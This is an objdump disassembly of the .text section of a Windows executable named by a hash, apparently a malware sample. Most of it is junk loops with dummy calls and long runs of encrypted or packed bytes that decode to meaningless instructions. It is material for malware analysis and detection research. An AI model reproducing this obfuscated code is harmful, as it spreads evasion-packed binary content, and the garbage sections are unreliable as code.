
bd1fd013571060a1fb9f841015a65069e41943bdfdee333e696071faa0bc3fd5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     bh,cl
  4011b8:	fbstp  TBYTE PTR [esi+esi*4+0x7e]
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [edx+0x0],dh
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xe0c1b73a
  40126d:	dec    esp
  40126e:	sbb    al,0xdd
  401270:	sahf   
  401271:	push   esi
  401272:	sbb    ah,bl
  401274:	js     0x401274
  401276:	mov    bl,0xab
  401278:	add    dl,al
  40127a:	popa   
  40127b:	mov    bh,0x2d
  40127d:	imul   ebx,DWORD PTR [edx-0x7],0xa5f79a97
  401284:	jge    0x4012c2
  401286:	mov    bl,BYTE PTR [eax-0x73]
  401289:	mov    WORD PTR [esp+ebp*4-0x73cf92ed],?
  401290:	repnz jecxz 0x401221
  401293:	xchg   esi,eax
  401294:	fst    QWORD PTR [edx]
  401296:	mov    cl,0xd4
  401298:	cmp    BYTE PTR [edx],bh
  40129a:	arpl   dx,di
  40129c:	xor    al,0x94
  40129e:	cs (bad) 
  4012a0:	loope  0x401265
  4012a2:	fmul   st(2),st
  4012a4:	push   ebp
  4012a5:	push   ss
  4012a6:	mov    ebx,0xba8138c0
  4012ab:	push   esi
  4012ac:	push   ecx
  4012ad:	icebp  
  4012ae:	push   cs
  4012af:	pop    ss
  4012b0:	pop    eax
  4012b1:	dec    edi
  4012b2:	inc    esi
  4012b3:	sub    BYTE PTR [edx],0x92
  4012b6:	cli    
  4012b7:	loope  0x40131e
  4012b9:	xchg   DWORD PTR [edx+0xcf33518],ebx
  4012bf:	push   esp
  4012c0:	in     eax,dx
  4012c1:	lock adc DWORD PTR [edi+0x47e46d49],ebx
  4012c8:	jecxz  0x401276
  4012ca:	xor    ebp,DWORD PTR [ebx+0x2282e304]
  4012d0:	adc    BYTE PTR [eax+0x54],0x23
  4012d4:	and    al,0x87
  4012d6:	fiadd  WORD PTR [ebp-0x53]
  4012d9:	imul   dh
  4012db:	mov    gs,WORD PTR [edi]
  4012dd:	test   BYTE PTR [edi],al
  4012df:	mov    ecx,0x235dacd6
  4012e4:	xor    esp,ecx
  4012e6:	mov    ds:0xbdf6b380,eax
  4012eb:	in     al,0x14
  4012ed:	sti    
  4012ee:	fdiv   QWORD PTR [esi+0xc812e8d]
  4012f4:	pop    eax
  4012f6:	inc    eax
  4012f7:	test   al,0xff
  4012f9:	mov    al,0xf8
  4012fb:	xor    DWORD PTR [eax-0x2096e48e],esi
  401301:	mov    edx,0xfddcbe5b
  401306:	sub    bh,BYTE PTR [edi+0x23560458]
  40130c:	adc    ebx,ecx
  40130e:	add    eax,0x7bf76533
  401313:	mov    ds:0x1194a9cd,eax
  401318:	add    DWORD PTR [eax],ebx
  40131a:	int    0xce
  40131c:	mov    cl,0x5f
  40131e:	enter  0x4efb,0x19
  401322:	sahf   
  401323:	test   BYTE PTR [eax+0x6b0345e],bl
  401329:	adc    BYTE PTR [edi+eax*1-0x2a],ah
  40132d:	pop    esi
  40132e:	push   cs
  40132f:	xlat   BYTE PTR ds:[ebx]
  401330:	shl    BYTE PTR [edi],cl
  401332:	lods   al,BYTE PTR ds:[esi]
  401333:	jle    0x40136f
  401335:	js     0x401357
  401337:	pop    edi
  401338:	mov    ecx,0xa1d38754
  40133d:	push   es
  40133e:	xor    BYTE PTR [eax],ch
  401340:	pop    ss
  401341:	cs mov dh,0xd5
  401344:	jl     0x40137c
  401346:	push   cs
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x4337d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	push   edx
  4013b4:	cmp    eax,0x7ffa8193
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x401376
  4013c0:	call   0xf0e4:0xbc413f49
  4013c7:	push   0x2a881ee0
  4013cc:	mov    bl,0xe9
  4013ce:	sahf   
  4013cf:	nop
  4013d0:	ss or  al,0x30
  4013d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d4:	mov    DWORD PTR ds:0x7934eebe,0x3ff5c0e0
  4013de:	mov    ah,0x83
  4013e0:	cdq    
  4013e1:	mov    esi,0x574fa8a6
  4013e6:	arpl   WORD PTR [ebx-0x44d1885e],di
  4013ec:	ret    0x3a38
  4013ef:	aaa    
  4013f0:	out    dx,al
  4013f1:	or     eax,0x3e219869
  4013f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013f7:	pop    ebx
  4013f8:	hlt    
  4013f9:	dec    esi
  4013fa:	fst    QWORD PTR [eax-0x12ce9dde]
  401400:	(bad)  
  401401:	jmp    0xa7d6c2c5
  401406:	lods   eax,DWORD PTR ds:[esi]
  401407:	jns    0x401444
  401409:	fimul  WORD PTR [ecx-0x65f9d029]
  40140f:	ja     0x401416
  401411:	jmp    0x365:0xee2308b7
  401418:	adc    eax,0x96083286
  40141d:	(bad)  
  40141e:	sub    esi,eax
  401420:	push   ss
  401421:	inc    ebx
  401422:	cmp    edi,ebp
  401424:	mov    ebx,0xa55e0b51
  401429:	lods   eax,DWORD PTR ds:[esi]
  40142a:	scas   al,BYTE PTR es:[edi]
  40142b:	inc    eax
  40142c:	pop    es
  40142d:	loopne 0x4013b3
  40142f:	mov    fs,WORD PTR ds:0x4eb36e9
  401435:	test   ah,cl
  401437:	inc    esi
  401438:	in     eax,dx
  401439:	jmp    0x3f8fae3e
  40143e:	repz mov esp,0x38e81ec
  401444:	clc    
  401445:	mov    ecx,0x8f3b16c4
  40144a:	mov    esp,0x78d17b3d
  40144f:	std    
  401450:	inc    edi
  401451:	jmp    0xc7c1:0x59e6bc72
  401458:	xchg   ebx,ebx
  40145a:	pushf  
  40145b:	mov    eax,ds:0x47d608cf
  401460:	and    ah,BYTE PTR [eax+0x6e]
  401463:	cdq    
  401464:	test   BYTE PTR [ebp-0x2b],al
  401467:	pop    es
  401468:	cld    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	push   ecx
  40146b:	pop    esi
  40146c:	shl    DWORD PTR [edi],cl
  40146e:	pusha  
  40146f:	and    DWORD PTR [eax-0x78ab2582],ecx
  401475:	jno    0x401496
  401477:	imul   esi,ecx,0x58
  40147a:	fs dec ebp
  40147c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40147d:	test   eax,0x5b983a64
  401482:	jae    0x4014f0
  401484:	sub    eax,DWORD PTR [ecx+0x3e8ad6d3]
  40148a:	lods   al,BYTE PTR es:[esi]
  40148c:	out    dx,al
  40148d:	mov    ch,0x41
  40148f:	ins    DWORD PTR es:[edi],dx
  401490:	mov    edi,0xe5f617c2
  401495:	pop    ecx
  401496:	jecxz  0x401515
  401498:	fistp  DWORD PTR [ebp+esi*1+0x437d3ce7]
  40149f:	fsub   DWORD PTR [eax+esi*4-0x49]
  4014a3:	mov    bh,0x20
  4014a5:	call   0xb26f:0xca0fec7e
  4014ac:	mov    bl,BYTE PTR [edi]
  4014ae:	lock mov eax,0xab63d443
  4014b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014b5:	(bad)  
  4014b6:	out    0xa7,al
  4014b8:	mov    al,dl
  4014ba:	mov    eax,ds:0xc2dcb3cc
  4014bf:	fld    DWORD PTR [edi+ebp*4+0x5]
  4014c3:	fsub   QWORD PTR [ecx+0x79ad7a0e]
  4014c9:	xor    DWORD PTR cs:[ebp-0x7473a848],ebx
  4014d0:	int3   
  4014d1:	push   ds
  4014d2:	cwde   
  4014d3:	xchg   DWORD PTR [esp+edx*2+0x199d9b54],ebx
  4014da:	dec    ecx
  4014db:	test   BYTE PTR [edi-0x38],0x13
  4014df:	fiadd  DWORD PTR [ebp+0x325ed92e]
  4014e5:	outs   dx,BYTE PTR ds:[esi]
  4014e6:	stc    
  4014e7:	pop    ds
  4014e8:	imul   eax,DWORD PTR [eax+0x77],0x130e783a
  4014ef:	jmp    0x7b71:0xd38352ae
  4014f6:	jl     0x40154d
  4014f8:	sbb    al,0xe1
  4014fa:	jne    0x4014bd
  4014fc:	ret    0x3d05
  4014ff:	cmp    al,BYTE PTR [ebx+0x6251bc05]
  401505:	xchg   edi,eax
  401506:	xchg   DWORD PTR ss:[edi+0x43],esp
  40150a:	pop    es
  40150b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40150c:	cdq    
  40150d:	inc    ecx
  40150e:	xor    edx,edx
  401510:	sbb    ch,bh
  401512:	cdq    
  401513:	jge    0x401536
  401515:	mov    esp,0xb7b4d2e6
  40151a:	xchg   ebp,eax
  40151b:	clc    
  40151c:	lock int 0xbd
  40151f:	sbb    BYTE PTR gs:[edx],ah
  401522:	dec    ebx
  401523:	cmp    al,0x3b
  401525:	ja     0x401568
  401527:	xchg   esi,eax
  401528:	repnz aad 0x44
  40152b:	adc    DWORD PTR [ebx],ebp
  40152d:	jge    0x40155c
  40152f:	xor    eax,0x23b1cd7a
  401534:	lahf   
  401535:	bound  ebx,QWORD PTR [esi-0x27]
  401538:	outs   dx,BYTE PTR ds:[esi]
  401539:	loopne 0x401523
  40153b:	pop    esi
  40153c:	mov    bl,0x53
  40153e:	jnp    0x4015b2
  401540:	ja     0x4014ea
  401542:	dec    DWORD PTR [ebx+0x1d31c445]
  401548:	(bad)  
  401549:	aaa    
  40154a:	inc    ebx
  40154b:	add    BYTE PTR [ebx],dh
  40154d:	(bad)  
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x468ccde3]
  401564:	jmp    0x7ebe926f
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x40153b
  40156e:	add    eax,0x79cc3928
  401573:	xchg   ebp,eax
  401574:	call   0xa79:0xd53ba76c
  40157b:	test   al,0x23
  40157d:	sub    al,0xdc
  40157f:	sub    cl,BYTE PTR [ecx-0x37cc9745]
  401585:	test   DWORD PTR [esi],ebx
  401587:	test   al,0xa4
  401589:	sbb    ch,0xf
  40158c:	adc    edi,ebp
  40158e:	cs xor al,ch
  401591:	cmp    dl,BYTE PTR [esi-0x42]
  401594:	fld    TBYTE PTR [ecx-0x329fb5b7]
  40159a:	mov    dl,0x54
  40159c:	jne    0x401540
  40159e:	retf   
  40159f:	lods   eax,DWORD PTR ds:[esi]
  4015a0:	ins    BYTE PTR es:[edi],dx
  4015a1:	sbb    edi,DWORD PTR [ecx+ecx*2]
  4015a4:	xor    eax,0xd1928190
  4015a9:	mov    edx,0x2a32693c
  4015ae:	add    al,0x5d
  4015b0:	sbb    DWORD PTR [eax-0xd],0xffffff8d
  4015b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b5:	mov    cl,0x87
  4015b7:	xchg   DWORD PTR [ecx+0x67],ebx
  4015ba:	add    ecx,DWORD PTR [ecx+0x4cf3106d]
  4015c0:	sub    ecx,DWORD PTR ds:0x758d3811
  4015c6:	and    eax,0xca1414a8
  4015cb:	push   ebx
  4015cc:	in     al,dx
  4015cd:	into   
  4015ce:	repz dec esi
  4015d0:	mov    esi,0x7ea751d8
  4015d5:	jmp    0x401598
  4015d7:	jbe    0x4015bd
  4015d9:	jmp    0x401563
  4015db:	xor    eax,0x332a6596
  4015e0:	add    al,BYTE PTR [ebx+0x5f208315]
  4015e6:	mov    DWORD PTR [edx],ecx
  4015e8:	fidivr WORD PTR [ebp+ecx*1-0x27]
  4015ec:	mov    ebx,0x73f287dd
  4015f1:	pop    esi
  4015f2:	inc    edx
  4015f3:	and    al,0x5
  4015f5:	jl     0x401612
  4015f7:	dec    esi
  4015f8:	or     eax,0xffffffe4
  4015fb:	mov    ebp,0x297827ea
  401600:	out    dx,al
  401601:	jo     0x4015fc
  401603:	mov    dh,0xed
  401605:	add    DWORD PTR [ebx+0x6f53abd1],ebx
  40160b:	int    0xf
  40160d:	iret   
  40160e:	out    0xb7,eax
  401610:	shr    BYTE PTR [ebp-0x1bec13f4],cl
  401616:	jb     0x40165d
  401618:	sti    
  401619:	xchg   ecx,eax
  40161a:	mov    ebp,0x5deee2e7
  40161f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401620:	mov    bl,0xce
  401622:	mov    ch,0x7e
  401624:	sub    ch,al
  401626:	cdq    
  401627:	pop    edi
  401628:	add    eax,0x2292a6d6
  40162d:	mov    BYTE PTR [edi+edi*8-0x4f],al
  401631:	inc    esp
  401632:	int3   
  401633:	in     eax,dx
  401634:	inc    esp
  401635:	dec    eax
  401636:	inc    di
  401638:	mov    ch,0x12
  40163a:	fs sti 
  40163c:	push   0xffffffb6
  40163e:	adc    BYTE PTR [edi],dh
  401640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401641:	ds jb  0x40166a
  401644:	pop    ebx
  401645:	imul   esi,DWORD PTR [ecx-0x73],0xffffffcc
  401649:	sub    DWORD PTR [edx+0x1b],edi
  40164c:	pop    ds
  40164d:	fisubr WORD PTR [eax]
  40164f:	xor    al,0x2a
  401651:	dec    esp
  401652:	inc    ebp
  401653:	test   eax,0xc9dceddd
  401658:	lods   eax,DWORD PTR ds:[esi]
  401659:	test   BYTE PTR [edx-0x61],dl
  40165c:	scas   eax,DWORD PTR es:[edi]
  40165d:	add    al,BYTE PTR [edi+esi*2]
  401660:	mov    dl,0x5b
  401662:	xlat   BYTE PTR ds:[ebx]
  401663:	int    0xd2
  401665:	add    eax,0x56ec344b
  40166a:	xchg   ebp,eax
  40166b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40166c:	sbb    ecx,DWORD PTR [edi-0x45]
  40166f:	and    BYTE PTR [eax],0xde
  401672:	pop    edx
  401673:	dec    ecx
  401674:	push   0x25
  401676:	ror    BYTE PTR [ecx+edx*1+0x3b],cl
  40167a:	xor    eax,0x9a8f537e
  40167f:	push   ebx
  401680:	mov    fs,WORD PTR [esi-0x14e512e]
  401686:	pop    esi
  401687:	jp     0x40169d
  401689:	mov    ebp,0x487dc3c2
  40168e:	sar    BYTE PTR [esi],cl
  401690:	xchg   ah,ah
  401692:	out    dx,al
  401693:	add    edi,ebp
  401695:	or     eax,0x7a98a31c
  40169a:	rcl    bl,cl
  40169c:	cli    
  40169d:	push   ebx
  40169e:	test   DWORD PTR [ecx-0x33f221be],ebx
  4016a4:	out    0xcc,eax
  4016a6:	and    al,0x29
  4016a8:	stc    
  4016a9:	fisttp WORD PTR [edx+0x2d]
  4016ac:	(bad)  
  4016ad:	cld    
  4016ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016af:	xchg   esp,eax
  4016b0:	pop    edx
  4016b1:	lea    eax,[ebx+0x40b61203]
  4016b7:	xor    BYTE PTR [ebx],al
  4016b9:	pop    ebx
  4016ba:	retf   
  4016bb:	xor    dl,BYTE PTR [ebp+0x42]
  4016be:	lds    ebp,FWORD PTR [esi-0x4b6765b4]
  4016c4:	xor    esi,DWORD PTR [edi+0x40]
  4016c7:	mov    edx,0x7ed7f151
  4016cc:	and    DWORD PTR [ecx+ecx*4-0x3a],esi
  4016d0:	xchg   ebp,eax
  4016d1:	push   DWORD PTR [edi]
  4016d3:	push   es
  4016d4:	push   esp
  4016d5:	iret   
  4016d6:	ret    0xff8a
  4016d9:	fnstsw WORD PTR [esi]
  4016db:	js     0x401757
  4016dd:	mov    edi,0x2a590a18
  4016e2:	mov    ecx,0x7b903e65
  4016e7:	ret    0x680f
  4016ea:	xor    al,0xf3
  4016ec:	and    DWORD PTR [eax+0x33b8146],edi
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x33996ade
  4018e9:	test   al,0xba
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x40188d
  4018f4:	iret   
  4018f5:	outs   dx,BYTE PTR ds:[esi]
  4018f6:	test   eax,0x7b40037d
  4018fb:	pop    edx
  4018fc:	int    0x8f
  4018fe:	or     eax,0x6ccf0a38
  401903:	daa    
  401904:	pusha  
  401905:	jg     0x4018af
  401907:	lods   eax,DWORD PTR ds:[esi]
  401908:	test   DWORD PTR [eax+0x4a4edf5d],esp
  40190e:	sti    
  40190f:	inc    edx
  401910:	stos   BYTE PTR es:[edi],al
  401911:	mov    dh,0x6a
  401913:	mov    ebx,DWORD PTR [edi+0x46fde937]
  401919:	nop
  40191a:	mov    dh,BYTE PTR [esi+0x6b]
  40191d:	pop    ss
  40191e:	mov    ds:0xcde833b4,al
  401923:	mov    ds:0x6973d11c,eax
  401928:	xlat   BYTE PTR ds:[ebx]
  401929:	out    dx,eax
  40192a:	xlat   BYTE PTR ds:[ebx]
  40192b:	stc    
  40192c:	jg     0x401971
  40192e:	icebp  
  40192f:	xchg   edx,eax
  401930:	or     eax,0x8cb483a3
  401935:	fs lock mov es,edx
  401939:	dec    eax
  40193a:	pop    esp
  40193b:	jecxz  0x4018bd
  40193d:	cdq    
  40193e:	push   esp
  40193f:	std    
  401940:	test   al,0x83
  401942:	data16 sbb al,0x72
  401945:	inc    ecx
  401946:	pop    esi
  401947:	add    eax,0x8aef9641
  40194c:	retf   
  40194d:	jo     0x401932
  40194f:	lods   eax,DWORD PTR ds:[esi]
  401950:	cli    
  401951:	sub    BYTE PTR [eax],dl
  401953:	dec    edi
  401954:	aad    0x12
  401956:	push   edi
  401957:	xchg   esi,eax
  401958:	adc    BYTE PTR [edi+0x73333895],ch
  40195e:	push   edx
  40195f:	and    BYTE PTR ds:0x41f407f,dh
  401965:	(bad)  
  401966:	lods   al,BYTE PTR ds:[esi]
  401967:	inc    edi
  401968:	clc    
  401969:	mov    BYTE PTR [ebx],dh
  40196b:	es pop ds
  40196d:	out    dx,al
  40196e:	cmp    DWORD PTR [edx+0x5c],edi
  401971:	jmp    0x40195b
  401973:	push   ds
  401974:	pop    edi
  401975:	xor    al,0xca
  401977:	jne    0x40194e
  401979:	imul   esp,DWORD PTR [ebx],0x65
  40197c:	xchg   ebx,eax
  40197d:	add    al,0x30
  40197f:	cld    
